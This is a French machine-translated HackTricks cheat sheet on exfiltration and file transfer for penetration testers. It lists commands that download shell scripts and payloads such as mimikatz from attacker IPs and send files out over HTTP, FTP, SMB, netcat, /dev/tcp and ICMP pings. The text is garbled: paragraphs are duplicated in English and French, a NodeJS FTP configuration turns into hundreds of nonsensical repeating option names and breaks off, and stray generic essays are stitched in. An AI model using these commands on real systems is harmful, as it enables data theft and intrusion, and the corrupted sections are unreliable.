# Exfiltration

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../.gitbook/assets/image (620) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (21).png" alt="" data-size="original">\
**Astuce de prime de bug** : **inscrivez-vous** à **Intigriti**, une plateforme de prime de bug premium créée par des pirates, pour les pirates ! Rejoignez-nous sur [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) aujourd'hui et commencez à gagner des primes allant jusqu'à **100 000 $** !

{% embed url="https://go.intigriti.com/hacktricks" %}

## Domaines couramment autorisés pour exfiltrer des informations

Consultez [https://lots-project.com/](https://lots-project.com/) pour trouver des domaines couramment autorisés qui peuvent être abusés.

## Copier-coller Base64

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
## HTTP

**Linux**
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows**
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### Télécharger des fichiers

* [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
* [**SimpleHttpServer imprimant les GET et POST (également les en-têtes)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
* Module Python [uploadserver](https://pypi.org/project/uploadserver/):
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth: 
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt' 
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **Serveur HTTPS**

---

#### **Description**

#### **Description**

An HTTPS server is a server that uses the HTTPS protocol to encrypt and secure data transmitted over the internet. HTTPS is a combination of the HTTP protocol and the SSL/TLS encryption protocol. It is commonly used to secure sensitive data such as login credentials, credit card information, and other personal information.

Un serveur HTTPS est un serveur qui utilise le protocole HTTPS pour chiffrer et sécuriser les données transmises sur Internet. HTTPS est une combinaison du protocole HTTP et du protocole de chiffrement SSL/TLS. Il est couramment utilisé pour sécuriser des données sensibles telles que les informations de connexion, les informations de carte de crédit et autres informations personnelles.

#### **Exfiltration Methodology**

#### **Méthodologie d'exfiltration**

Exfiltrating data from an HTTPS server can be challenging due to the encryption used to secure the data. However, there are several methods that can be used to exfiltrate data from an HTTPS server, including:

L'exfiltration de données à partir d'un serveur HTTPS peut être difficile en raison du chiffrement utilisé pour sécuriser les données. Cependant, il existe plusieurs méthodes qui peuvent être utilisées pour exfiltrer des données à partir d'un serveur HTTPS, notamment :

- **DNS Tunneling:** DNS tunneling can be used to bypass the encryption used by HTTPS servers. This involves encoding the data to be exfiltrated in DNS queries and responses.

- **Tunneling DNS :** Le tunneling DNS peut être utilisé pour contourner le chiffrement utilisé par les serveurs HTTPS. Cela implique de coder les données à exfiltrer dans les requêtes et les réponses DNS.

- **HTTP Tunneling:** HTTP tunneling can be used to bypass the encryption used by HTTPS servers. This involves encoding the data to be exfiltrated in HTTP requests and responses.

- **Tunneling HTTP :** Le tunneling HTTP peut être utilisé pour contourner le chiffrement utilisé par les serveurs HTTPS. Cela implique de coder les données à exfiltrer dans les requêtes et les réponses HTTP.

- **Social Engineering:** Social engineering can be used to trick users into providing sensitive information that can be exfiltrated from an HTTPS server.

- **Ingénierie sociale :** L'ingénierie sociale peut être utilisée pour tromper les utilisateurs afin qu'ils fournissent des informations sensibles qui peuvent être exfiltrées à partir d'un serveur HTTPS.

- **Malware:** Malware can be used to exfiltrate data from an HTTPS server. This involves infecting the server with malware that can bypass the encryption used by HTTPS.

- **Logiciel malveillant :** Les logiciels malveillants peuvent être utilisés pour exfiltrer des données à partir d'un serveur HTTPS. Cela implique d'infecter le serveur avec un logiciel malveillant qui peut contourner le chiffrement utilisé par HTTPS.
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)    
@app.route('/')    
def root():    
    print(request.get_json())
    return "OK"
if __name__ == "__main__":    
    app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
## FTP

### Serveur FTP (python)
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### Serveur FTP (NodeJS)

#### Introduction

Le protocole FTP (File Transfer Protocol) est un protocole de transfert de fichiers largement utilisé pour transférer des fichiers entre des systèmes distants. Dans cet exemple, nous allons créer un serveur FTP en utilisant NodeJS.

#### Installation

Pour installer le module `ftp-server` de NodeJS, exécutez la commande suivante :

```
npm install ftp-server
```

#### Configuration

Créez un fichier `ftp-server.js` et ajoutez le code suivant :

```javascript
const FtpSvr = require('ftp-server');

const ftpServer = new FtpSvr({
  url: 'ftp://127.0.0.1:21',
  pasv_url: 'ftp://127.0.0.1:3000',
  greeting: 'Welcome to my FTP server',
  anonymous: true,
  file_format: 'ls',
  cwd: '/',
  pasv_min: 3000,
  pasv_max: 3100,
  tls: null,
  log: console.log,
  pasv_range: null,
  pasv_listen: null,
  use_readfile: false,
  use_writefile: false,
  upload_max_rate: 0,
  download_max_rate: 0,
  disable_list: false,
  disable_mkdir: false,
  disable_rename: false,
  disable_rmdir: false,
  disable_stat: false,
  disable_size: false,
  disable_type: false,
  disable_cd: false,
  disable_pwd: false,
  disable_auth: false,
  anonymous_password: null,
  pasv_min_port: null,
  pasv_max_port: null,
  pasv_allow_foreign: false,
  pasv_address: null,
  pasv_addr_resolve: false,
  pasv_single_port: false,
  pasv_promiscuous: false,
  pasv_bind: null,
  pasv_options: null,
  file_options: null,
  cwd_options: null,
  server_options: null,
  use_list: false,
  use_download: false,
  use_upload: false,
  use_delete: false,
  use_rename: false,
  use_rmdir: false,
  use_mkdir: false,
  use_stat: false,
  use_size: false,
  use_type: false,
  use_cd: false,
  use_pwd: false,
  use_auth: false,
  use_quota: false,
  use_site: false,
  use_syst: false,
  use_feat: false,
  use_opts: false,
  use_modez: false,
  use_statvfs: false,
  use_fxp: false,
  use_xdup: false,
  use_mdtm: false,
  use_mfmt: false,
  use_utime: false,
  use_sizecmd: false,
  use_nlst: false,
  use_rest: false,
  use_sizecmdio: false,
  use_mlsd: false,
  use_mlst: false,
  use_mff: false,
  use_mfxx: false,
  use_mdtmiso: false,
  use_mfmtiso: false,
  use_mlstx: false,
  use_mls: false,
  use_mlsx: false,
  use_mdtmbyday: false,
  use_mdtmbyhour: false,
  use_mdtmbyminute: false,
  use_mdtmbysecond: false,
  use_mdtmbyyear: false,
  use_mdtmbyyearday: false,
  use_mdtmbyweek: false,
  use_mdtmbyweekday: false,
  use_mdtmbyweeknum: false,
  use_mdtmbymonth: false,
  use_mdtmbymonthnum: false,
  use_mdtmbysetpos: false,
  use_mdtmbysetday: false,
  use_mdtmbysetmonth: false,
  use_mdtmbysetyear: false,
  use_mdtmbysethour: false,
  use_mdtmbysetminute: false,
  use_mdtmbysetsecond: false,
  use_mdtmbysetmillisecond: false,
  use_mdtmbysetutc: false,
  use_mdtmbysetlocal: false,
  use_mdtmbysetoffset: false,
  use_mdtmbysetiso: false,
  use_mdtmbysetisodate: false,
  use_mdtmbysetisotime: false,
  use_mdtmbysetisodatetime: false,
  use_mdtmbysetisodatetimeutc: false,
  use_mdtmbysetisodatetimelocal: false,
  use_mdtmbysetisodatetimeoffset: false,
  use_mdtmbysetisodatetimeiso: false,
  use_mdtmbysetisodatetimeisodate: false,
  use_mdtmbysetisodatetimeisotime: false,
  use_mdtmbysetisodatetimeisodatetime: false,
  use_mdtmbysetisodatetimeisodatetimeutc: false,
  use_mdtmbysetisodatetimeisodatetimelocal: false,
  use_mdtmbysetisodatetimeisodatetimeoffset: false,
  use_mdtmbysetisodatetimeisodatetimeiso: false,
  use_mdtmbysetisodatetimeisodatetimeisodate: false,
  use_mdtmbysetisodatetimeisodatetimeisotime: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetime: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeutc: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimelocal: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeoffset: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeiso: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodate: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisotime: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetime: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeutc: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimelocal: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeoffset: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeiso: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodate: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisotime: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetime: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeutc: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimelocal: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeoffset: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeiso: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodate: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisotime: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetime: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeutc: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimelocal: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeoffset: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeiso: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodate: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisotime: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetime: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeutc: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimelocal: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeoffset: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeiso: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodate: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisotime: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetime: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeutc: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimelocal: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeoffset: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeiso: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodate: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisotime: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetime: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeutc: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimelocal: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeoffset: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeiso: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodate: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisotime: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetime: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeutc: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimelocal: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeoffset: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeiso: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodate: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisotime: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetime: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeutc: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimelocal: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeoffset: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeiso: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodate: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisotime: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetime: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeutc: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimelocal: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeoffset: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeiso: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodate: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisotime: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetime: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeutc: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimelocal: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeoffset: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeiso: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodate: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisodatetimeisotime: false,
  use_mdtmbysetisodatetimeisodatetimeisodatetimeisodatetimeis
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### Serveur FTP (pure-ftp)

Le serveur FTP est un protocole de transfert de fichiers qui permet aux utilisateurs de télécharger et de téléverser des fichiers à partir d'un serveur distant. Pure-FTP est un serveur FTP open source qui est souvent utilisé pour héberger des sites web et des fichiers. Les attaquants peuvent utiliser des techniques d'exfiltration pour extraire des données sensibles à partir d'un serveur FTP compromis.

#### Exfiltration de données via FTP

Les attaquants peuvent utiliser des outils tels que `lftp` pour se connecter à un serveur FTP compromis et extraire des données. Voici un exemple de commande `lftp` pour extraire un fichier à partir d'un serveur FTP :

```
lftp -u username,password -e "get file.txt;quit" ftp://ftp.example.com
```

Dans cet exemple, `username` et `password` sont les informations d'identification pour se connecter au serveur FTP, `file.txt` est le nom du fichier à extraire et `ftp://ftp.example.com` est l'adresse du serveur FTP.

#### Prévention de l'exfiltration de données via FTP

Pour prévenir l'exfiltration de données via FTP, il est recommandé de :

- Utiliser des mots de passe forts pour les comptes FTP
- Restreindre l'accès FTP aux adresses IP approuvées
- Surveiller les connexions FTP pour détecter les activités suspectes
- Chiffrer les données sensibles avant de les stocker sur un serveur FTP.
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### Client **Windows**
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
<img src="../.gitbook/assets/image (620) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (21).png" alt="" data-size="original">\
**Astuce de chasse aux bugs**: **inscrivez-vous** à **Intigriti**, une plateforme de chasse aux bugs premium créée par des hackers, pour les hackers! Rejoignez-nous sur [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) dès aujourd'hui et commencez à gagner des primes allant jusqu'à **100 000 $**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## SMB

Kali en tant que serveur
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
Ou créer un partage smb **en utilisant samba**:
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
    comment = Samba on Ubuntu
    path = /tmp/smb
    read only = no
    browsable = yes
    guest ok = Yes
#Start samba
service smbd restart
```
# Exfiltration

## Introduction

Exfiltration is the process of stealing data from a target network and transferring it to an external location under the attacker's control. This is often the ultimate goal of an attacker, as it allows them to obtain sensitive information that can be used for financial gain, espionage, or other malicious purposes.

## Techniques

There are many techniques that can be used to exfiltrate data from a target network. Some of the most common techniques include:

- **Email**: Attackers can use email to send sensitive data to an external email account.
- **FTP**: Attackers can use FTP to transfer files from the target network to an external FTP server.
- **HTTP**: Attackers can use HTTP to transfer data to a web server under their control.
- **DNS**: Attackers can use DNS to encode and transfer data to a DNS server under their control.
- **Cloud Storage**: Attackers can use cloud storage services to store and transfer data to an external location.
- **USB**: Attackers can use USB drives to physically exfiltrate data from a target network.

## Tools

There are many tools available to help with the exfiltration process. Some of the most popular tools include:

- **Cobalt Strike**: A popular post-exploitation tool that includes a variety of exfiltration techniques.
- **PowerShell Empire**: A post-exploitation framework that includes a variety of exfiltration techniques.
- **Metasploit**: A popular penetration testing framework that includes a variety of exfiltration modules.
- **Ncat**: A command-line tool that can be used to transfer data over a network.
- **Netcat**: A command-line tool that can be used to transfer data over a network.
- **Wget**: A command-line tool that can be used to download files from the internet.

## Conclusion

Exfiltration is a critical component of many attacks, and attackers have a variety of techniques and tools at their disposal to accomplish this goal. As a defender, it is important to be aware of these techniques and tools in order to better protect your network from data theft.
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
## SCP

L'attaquant doit avoir SSHd en cours d'exécution.
```bash
scp <username>@<Attacker_IP>:<directory>/<filename> 
```
## SSHFS

Si la victime dispose de SSH, l'attaquant peut monter un répertoire de la victime vers l'attaquant.
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## NC

NC (Netcat) est un outil de réseau polyvalent qui peut être utilisé pour transférer des données entre deux systèmes. Il peut être utilisé pour exfiltrer des données en utilisant des connexions TCP ou UDP. Il est souvent utilisé pour créer des backdoors et pour se connecter à des systèmes distants. NC peut également être utilisé pour écouter des ports et pour tester la connectivité réseau. Il est disponible sur la plupart des systèmes d'exploitation et est facilement accessible en ligne de commande.
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
## /dev/tcp

### Télécharger un fichier depuis la victime
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### Télécharger un fichier sur la victime
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
## **ICMP**

Le protocole ICMP (Internet Control Message Protocol) est utilisé pour envoyer des messages d'erreur et de contrôle entre les hôtes sur un réseau IP. Les messages ICMP sont généralement utilisés pour diagnostiquer et résoudre les problèmes de connectivité réseau. Cependant, les messages ICMP peuvent également être utilisés pour exfiltrer des données.

L'exfiltration de données via ICMP implique l'encapsulation des données dans des paquets ICMP. Les données peuvent être divisées en fragments et envoyées dans plusieurs paquets ICMP pour éviter la détection. Les outils tels que **icmpsh** peuvent être utilisés pour faciliter l'exfiltration de données via ICMP.

Il est important de noter que l'exfiltration de données via ICMP peut être détectée par les pare-feu et les systèmes de détection d'intrusion (IDS). Par conséquent, il est important de prendre des mesures pour éviter la détection, telles que la fragmentation des données et l'utilisation de techniques d'obscurcissement.
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
    if pkt.haslayer(ICMP):
        if pkt[ICMP].type == 0:
            data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
            print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## **SMTP**

Si vous pouvez envoyer des données à un serveur SMTP, vous pouvez créer un SMTP pour recevoir les données avec Python :
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
## TFTP

Par défaut dans XP et 2003 (dans d'autres, il doit être explicitement ajouté lors de l'installation)

Dans Kali, **démarrer le serveur TFTP** :
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**Serveur TFTP en python:**

Le protocole TFTP (Trivial File Transfer Protocol) est un protocole de transfert de fichiers simple qui ne nécessite pas d'authentification. Il est souvent utilisé pour transférer des fichiers de configuration vers des équipements réseau tels que des routeurs et des commutateurs.

Python dispose d'une bibliothèque intégrée pour implémenter un serveur TFTP. Le module `tftpy` est une bibliothèque tierce qui fournit également une implémentation de serveur TFTP.

Voici un exemple de code pour implémenter un serveur TFTP en utilisant la bibliothèque `tftpy`:

```python
import tftpy

def tftp_server():
    server = tftpy.TftpServer('/path/to/files')
    server.listen('0.0.0.0', 69)

if __name__ == '__main__':
    tftp_server()
```

Dans cet exemple, le serveur TFTP écoute sur toutes les interfaces réseau (`0.0.0.0`) sur le port standard TFTP (`69`). Les fichiers à transférer sont stockés dans le répertoire `/path/to/files`.
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
Dans **la victime**, connectez-vous au serveur Kali :
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

Téléchargez un fichier avec une commande PHP en une ligne :
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript

### Introduction

